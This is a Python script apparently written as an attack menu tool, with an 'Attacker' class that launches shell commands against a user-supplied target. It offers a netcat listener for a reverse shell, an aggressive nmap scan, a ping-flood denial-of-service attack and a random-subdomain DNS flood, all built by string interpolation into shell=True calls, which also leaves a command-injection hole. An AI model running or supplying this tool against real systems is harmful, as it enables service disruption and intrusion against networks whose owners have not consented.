import subprocess

class Attacker:
    def log_status(self, message):
        # Print status messages to the terminal.
        print(message)

    def run_command_in_terminal(self, command):
         
        try:
            # Running command directly in the current shell.
            subprocess.Popen(command, shell=True)
            self.log_status(f"Launched command: {command}")
        except Exception as e:
            self.log_status(f"Error launching command: {e}")

    def start_reverse_shell(self, port):
        """Launch the reverse shell command using the specified port."""
        if not port:
            self.log_status("Please enter a port for the reverse shell.")
            return
        command = f"nc -lvnp {port}"
        self.run_command_in_terminal(command)

    def start_nmap_scan(self, target_ip):
        """Launch the Nmap scan command using the target IP."""
        if not target_ip:
            self.log_status("Please enter a target IP for the Nmap scan.")
            return
        command = f"nmap -A -T4 {target_ip}"
        self.run_command_in_terminal(command)

    def start_dos_attack(self, target_ip):
        """Launch the DoS attack command using the target IP."""
        if not target_ip:
            self.log_status("Please enter a target IP for the DoS attack.")
            return
        command = f"sudo ping -f -s 65000 {target_ip}"
        self.run_command_in_terminal(command)

    def start_dns_attack(self, dns_server_ip):
        """Launch the DNS attack command using the provided DNS server IP."""
        if not dns_server_ip:
            self.log_status("Please enter a DNS Server IP for the DNS attack.")
            return
        command = (
            f'dig $(python3 -c "import random, string; print(\'.\'.join('
            f'\'\'.join(random.choices(string.ascii_lowercase, k=20)) for _ in range(6)) + \'.example.com\')") '
            f'@{dns_server_ip}'
        )
        self.run_command_in_terminal(command)

def main():
    attacker = Attacker()
    while True:
        print("\nSelect an attack option:")
        print("1. Reverse Shell")
        print("2. Nmap Scan")
        print("3. DoS Attack")
        print("4. DNS Attack")
        print("5. Exit")
        choice = input("Enter your choice (1-5): ").strip()

        if choice == "1":
            port = input("Enter port for reverse shell: ").strip()
            attacker.start_reverse_shell(port)
        elif choice == "2":
            target_ip = input("Enter target IP for Nmap scan: ").strip()
            attacker.start_nmap_scan(target_ip)
        elif choice == "3":
            target_ip = input("Enter target IP for DoS attack: ").strip()
            attacker.start_dos_attack(target_ip)
        elif choice == "4":
            dns_ip = input("Enter DNS Server IP for DNS attack (default is 192.168.101.6): ").strip() or "192.168.101.6"
            attacker.start_dns_attack(dns_ip)
        elif choice == "5":
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please try again.")

if __name__ == '__main__':
    main()
